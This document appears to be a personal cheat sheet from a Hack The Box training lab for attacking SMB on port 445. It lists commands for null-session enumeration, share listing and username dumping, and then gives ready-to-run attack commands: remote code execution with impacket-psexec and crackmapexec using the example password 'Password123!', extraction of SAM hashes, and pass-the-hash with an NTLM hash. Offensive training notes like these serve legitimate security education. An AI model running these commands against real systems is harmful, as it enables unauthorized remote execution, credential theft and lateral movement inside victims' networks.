enum4Ports: 445

#### Generic commands

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //<FQDN/IP>`|Null session authentication on SMB.|
|`smbclient //<FQDN/IP>/<share>`|Connect to a specific SMB share.|
|`rpcclient -U "" <FQDN/IP>`|Interaction with the target using RPC.|
|`samrdump.py <FQDN/IP>`|Username enumeration using Impacket scripts.|
|`smbmap -H <FQDN/IP>`|Enumerating SMB shares.|
|`crackmapexec smb <FQDN/IP> --shares -u '' -p ''`|Enumerating SMB shares using null session authentication.|
|`enum4linux-ng.py <FQDN/IP> -A`|SMB enumeration using enum4linux.|

```shell-session
smbclient -U david \\\\10.129.163.211\\david
```

#### Impacket PsExec (RCE)

```shell-session
Tachipy@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

#### CrackMapExec (RCE)

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

#### Enumerating Logged-on Users

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

#### Extract Hashes from SAM Database

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

#### Pass-the-Hash (PtH)

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```